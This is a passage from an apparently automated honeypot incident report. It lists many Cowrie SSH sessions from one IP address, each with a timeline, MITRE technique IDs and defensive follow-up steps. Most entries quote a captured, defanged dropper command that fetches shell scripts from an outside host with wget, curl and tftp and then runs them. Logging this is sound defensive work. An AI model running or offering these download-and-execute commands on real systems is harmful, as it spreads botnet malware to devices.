| `2026-08-25 09:58:18` | `cowrie.command.success` |
| `2026-08-25 09:58:18` | `cowrie.log.closed` |
| `2026-08-25 09:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6428cada4927

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:18` | `cowrie.session.connect` |
| `2026-08-25 09:58:18` | `cowrie.login.success` |
| `2026-08-25 09:58:19` | `cowrie.session.params` |
| `2026-08-25 09:58:19` | `cowrie.command.input` |
| `2026-08-25 09:58:19` | `cowrie.command.success` |
| `2026-08-25 09:58:20` | `cowrie.log.closed` |
| `2026-08-25 09:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef10ef584909

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:20` | `cowrie.session.connect` |
| `2026-08-25 09:58:20` | `cowrie.login.success` |
| `2026-08-25 09:58:20` | `cowrie.session.params` |
| `2026-08-25 09:58:21` | `cowrie.command.input` |
| `2026-08-25 09:58:21` | `cowrie.command.success` |
| `2026-08-25 09:58:21` | `cowrie.log.closed` |
| `2026-08-25 09:58:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ebaa06555b

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:21` | `cowrie.session.connect` |
| `2026-08-25 09:58:21` | `cowrie.login.success` |
| `2026-08-25 09:58:22` | `cowrie.session.params` |
| `2026-08-25 09:58:22` | `cowrie.command.input` |
| `2026-08-25 09:58:22` | `cowrie.command.success` |
| `2026-08-25 09:58:23` | `cowrie.log.closed` |
| `2026-08-25 09:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a922d7ebb82f

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:23` | `cowrie.session.connect` |
| `2026-08-25 09:58:23` | `cowrie.login.success` |
| `2026-08-25 09:58:23` | `cowrie.session.params` |
| `2026-08-25 09:58:24` | `cowrie.command.input` |
| `2026-08-25 09:58:24` | `cowrie.command.success` |
| `2026-08-25 09:58:24` | `cowrie.log.closed` |
| `2026-08-25 09:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2cd75996d85

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:24` | `cowrie.session.connect` |
| `2026-08-25 09:58:24` | `cowrie.login.success` |
| `2026-08-25 09:58:25` | `cowrie.session.params` |
| `2026-08-25 09:58:25` | `cowrie.command.input` |
| `2026-08-25 09:58:25` | `cowrie.command.success` |
| `2026-08-25 09:58:26` | `cowrie.log.closed` |
| `2026-08-25 09:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd74e14322a0

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:26` | `cowrie.session.connect` |
| `2026-08-25 09:58:26` | `cowrie.login.success` |
| `2026-08-25 09:58:26` | `cowrie.session.params` |
| `2026-08-25 09:58:27` | `cowrie.command.input` |
| `2026-08-25 09:58:27` | `cowrie.command.success` |
| `2026-08-25 09:58:27` | `cowrie.log.closed` |
| `2026-08-25 09:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a721dbe24e7e

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:27` | `cowrie.session.connect` |
| `2026-08-25 09:58:27` | `cowrie.login.success` |
| `2026-08-25 09:58:28` | `cowrie.session.params` |
| `2026-08-25 09:58:28` | `cowrie.command.input` |
| `2026-08-25 09:58:28` | `cowrie.command.success` |
| `2026-08-25 09:58:29` | `cowrie.log.closed` |
| `2026-08-25 09:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e904bfaca251

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:29` | `cowrie.session.connect` |
| `2026-08-25 09:58:29` | `cowrie.login.success` |
| `2026-08-25 09:58:30` | `cowrie.session.params` |
| `2026-08-25 09:58:30` | `cowrie.log.closed` |
| `2026-08-25 09:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b514d93400

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:30` | `cowrie.session.connect` |
| `2026-08-25 09:58:30` | `cowrie.login.success` |
| `2026-08-25 09:58:31` | `cowrie.session.params` |
| `2026-08-25 09:58:31` | `cowrie.command.input` |
| `2026-08-25 09:58:31` | `cowrie.command.success` |
| `2026-08-25 09:58:31` | `cowrie.log.closed` |
| `2026-08-25 09:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bebdf232408d

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:31` | `cowrie.session.connect` |
| `2026-08-25 09:58:32` | `cowrie.login.success` |
| `2026-08-25 09:58:32` | `cowrie.session.params` |
| `2026-08-25 09:58:32` | `cowrie.command.input` |
| `2026-08-25 09:58:32` | `cowrie.command.success` |
| `2026-08-25 09:58:33` | `cowrie.log.closed` |
| `2026-08-25 09:58:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d115273b9a

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:33` | `cowrie.session.connect` |
| `2026-08-25 09:58:33` | `cowrie.login.success` |
| `2026-08-25 09:58:34` | `cowrie.session.params` |
| `2026-08-25 09:58:34` | `cowrie.command.input` |
| `2026-08-25 09:58:34` | `cowrie.command.success` |
| `2026-08-25 09:58:34` | `cowrie.log.closed` |
| `2026-08-25 09:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5396c296a6c

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:34` | `cowrie.session.connect` |
| `2026-08-25 09:58:35` | `cowrie.login.success` |
| `2026-08-25 09:58:35` | `cowrie.session.params` |
| `2026-08-25 09:58:35` | `cowrie.command.input` |
| `2026-08-25 09:58:35` | `cowrie.command.success` |
| `2026-08-25 09:58:36` | `cowrie.log.closed` |
| `2026-08-25 09:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31c587356115

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:36` | `cowrie.session.connect` |
| `2026-08-25 09:58:36` | `cowrie.login.success` |
| `2026-08-25 09:58:37` | `cowrie.session.params` |
| `2026-08-25 09:58:37` | `cowrie.command.input` |
| `2026-08-25 09:58:37` | `cowrie.command.success` |
| `2026-08-25 09:58:37` | `cowrie.log.closed` |
| `2026-08-25 09:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ae9ebd0fdb

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:37` | `cowrie.session.connect` |
| `2026-08-25 09:58:38` | `cowrie.login.success` |
| `2026-08-25 09:58:38` | `cowrie.session.params` |
| `2026-08-25 09:58:38` | `cowrie.command.input` |
| `2026-08-25 09:58:38` | `cowrie.command.success` |
| `2026-08-25 09:58:39` | `cowrie.log.closed` |
| `2026-08-25 09:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bfc7b540ec

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:39` | `cowrie.session.connect` |
| `2026-08-25 09:58:39` | `cowrie.login.success` |
| `2026-08-25 09:58:40` | `cowrie.session.params` |
| `2026-08-25 09:58:40` | `cowrie.command.input` |
| `2026-08-25 09:58:40` | `cowrie.command.success` |
| `2026-08-25 09:58:40` | `cowrie.log.closed` |
| `2026-08-25 09:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a6b69c6ef40

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:40` | `cowrie.session.connect` |
| `2026-08-25 09:58:41` | `cowrie.login.success` |
| `2026-08-25 09:58:41` | `cowrie.session.params` |
| `2026-08-25 09:58:41` | `cowrie.command.input` |
| `2026-08-25 09:58:41` | `cowrie.command.success` |
| `2026-08-25 09:58:42` | `cowrie.log.closed` |
| `2026-08-25 09:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06c4977122b8

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:42` | `cowrie.session.connect` |
| `2026-08-25 09:58:42` | `cowrie.login.success` |
| `2026-08-25 09:58:43` | `cowrie.session.params` |
| `2026-08-25 09:58:43` | `cowrie.command.input` |
| `2026-08-25 09:58:43` | `cowrie.command.success` |
| `2026-08-25 09:58:43` | `cowrie.log.closed` |
| `2026-08-25 09:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.135.194[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.135.194[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb441eafa024

| Field | Detail |
|---|---|
| **Source IP** | `45.135.194[.]26` |
| **First Seen** | 2026-08-25 09:58 |
| **Last Seen** | 2026-08-25 09:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /run 2>/dev/null || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; busybox wget hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh 2>/dev/null; chmod 777 handshakebins.sh 2>/dev/null; sh handshakebins.sh 2>/dev/null; tftp 213.232.114[.]14 -c get handshaketftp1.sh 2>/dev/null; chmod 777 handshaketftp1.sh 2>/dev/null; sh handshaketftp1.sh 2>/dev/null; tftp -r handshaketftp2.sh -g 213.232.114[.]14 2>/dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 09:58:43` | `cowrie.session.connect` |
| `2026-08-25 09:58:43` | `cowrie.login.success` |
| `2026-08-25 09:58:44` | `cowrie.session.params` |
| `2026-08-25 09:58:44` | `cowrie.command.input` |
